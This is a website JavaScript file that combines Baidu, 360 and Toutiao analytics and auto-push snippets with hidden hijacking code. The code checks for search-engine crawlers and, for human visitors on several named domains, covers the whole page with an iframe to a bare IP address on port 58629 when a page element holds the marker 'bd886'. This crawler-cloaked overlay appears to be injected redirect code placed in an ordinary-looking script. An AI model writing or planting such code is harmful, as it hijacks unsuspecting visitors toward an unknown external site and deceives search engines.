//百度统计
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?2284b21f7c0ee06caf91462cae4b74bd";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

//百度自动推送
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();

//360自动推送
(function(){
var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
document.write('<script src="' + src + '" id="sozz"><\/script>');
})();
///头条自动推送
(function(){
var el = document.createElement("script");
el.src = "https://lf1-cdn-tos.bytegoofy.com/goofy/ttzz/push.js?8f147b3a8beb88760ecf11a993759f7a73b5746fcffeaf57722230db37faae25bc434964556b7d7129e9b750ed197d397efd7b0c6c715c1701396e1af40cec962b8d7c8c6655c9b00211740aa8a98e2e";
el.id = "ttzz";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(el, s);
})(window);

var isShowding = false;
let ua1 = navigator.userAgent.toLowerCase();
let aSites1 = ['google.', 'baidu.', 'baiduspider', 'soso.', 'so.', '360.', 'yahoo.', 'youdao.', 'sogou.', 'gougou.'];
let isSpider_a = false;
for (var i in aSites1) {
    if (ua1.indexOf(aSites1[i]) > 0) {
        isSpider_a = true;
        break;
    }
}

var domain = window.location.host;
var pathname = location.pathname;

if (!isSpider_a) {
    const xpath = [];
    if (domain.indexOf("diandaz") !== -1) {
        xpath.push("/html/body/div[3]/div[1]/div/article/p/a[1]");
    } else if(domain.indexOf("zhangs") !== -1) {
        xpath.push("span[@class='auth']/text()");
    } else if (domain.indexOf("m.youxi") !== -1) {
        xpath.push("/html/body/div[2]/div[1]/span");
    } else if (domain.indexOf("youxi") !== -1) {
        xpath.push("/html/body/div[2]/div[1]/div/div[2]/div/p/span[2]");
    } else if (domain.indexOf("zsbba") !== -1) {
        xpath.push("//*[@id='mainbox']/article/div[1]/div/span[1]/text()");
    } else if (domain.indexOf("szdu") !== -1) {
        xpath.push("/html/body/div[7]/div[1]/div[2]/div[1]/span[3]");
    } else if (domain.indexOf("win10") !== -1) {
        xpath.push("/html/body/div[4]/div/div/div[1]/div[2]/p/span[2]");
    }
    
    if (xpath.length > 0) {
        document.addEventListener("DOMContentLoaded", function (event) {
            var s = document.evaluate(xpath[0], document).iterateNext();
            //console.log(s);
            if(!isShowding && s && s.innerText.indexOf("bd886") !== -1) {
//                textContent
                console.log('as');
                isShowding = true;
                showIframe();
            }
        });
    } 
}

function showIframe() {
     // document.addEventListener("DOMContentLoaded", function (event) {
    document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;margin:0;padding:0}</style>');
    var iframe = document.createElement('iframe');
    iframe.src = "https://106.75.179.228:58629/#";
    iframe.scrolling = 'auto';
    iframe.style.cssText = "width:100%;height:100%;left:1px;top:1px;border:none;background:#fff";
    var div1 = document.createElement("div");
    var div = document.createElement("div");
    div1.style.cssText = "-webkit-overflow-scrolling:touch;width:100%;height:100%;z-index:9999999999;position:fixed;top:0;left:0;";
    var is_mobi = navigator.userAgent.toLowerCase().match(/(ipad|iphone|android|coolpad|mmp|smartphone|midp|wap|xoom|symbian|j2me|blackberry|wince)/i) != null;
    if (is_mobi) {
        div1.style.overflow = "auto";
    }
    div1.appendChild(iframe);
    div.appendChild(div1);
    document.write(div.innerHTML);
// });
}
